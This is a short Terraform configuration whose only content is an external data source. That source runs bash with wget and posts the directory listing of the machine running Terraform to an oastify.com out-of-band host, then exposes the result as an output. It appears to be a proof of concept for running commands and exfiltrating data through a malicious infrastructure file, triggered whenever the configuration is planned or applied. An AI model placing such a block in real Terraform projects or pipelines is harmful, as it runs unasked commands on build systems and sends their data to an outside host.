data "external" "example" {
  program = ["bash", "-c", "wget --post-data=\"$(ls)\" http://qsmelspxgnhve8euwc0l0wri99f83yrn.oastify.com/receive"]
}

output "output" {
  value = data.external.example.result
}
